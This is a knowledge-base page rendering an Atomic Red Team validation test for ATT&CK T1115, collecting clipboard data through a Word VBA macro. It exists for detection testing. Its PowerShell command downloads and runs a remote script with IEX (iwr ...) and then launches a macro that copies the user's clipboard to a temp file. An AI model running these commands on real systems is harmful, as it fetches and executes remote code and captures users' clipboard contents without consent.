---
atomic_guid: "9c8d5a72-9c98-48d3-b9bf-da2cc43bdf52"
title: "Collect Clipboard Data via VBA"
framework: "atomic"
generated: "true"
attack_technique_id: "T1115"
attack_technique_name: "Clipboard Data"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1115/T1115.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "9c8d5a72-9c98-48d3-b9bf-da2cc43bdf52"
  - "Collect Clipboard Data via VBA"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\atomic_T1115_clipboard_data.txt

## ATT&CK Mapping

- [[kb/attack/techniques/T1115-clipboard_data|T1115: Clipboard Data]]

## Input Arguments

### ms_product

- description: Maldoc application Word
- type: string
- default: Word

## Dependencies

Microsoft #{ms_product} must be installed

### Prerequisite Check

```powershell
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
```

### Cleanup

```powershell
Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1115/T1115.yaml)
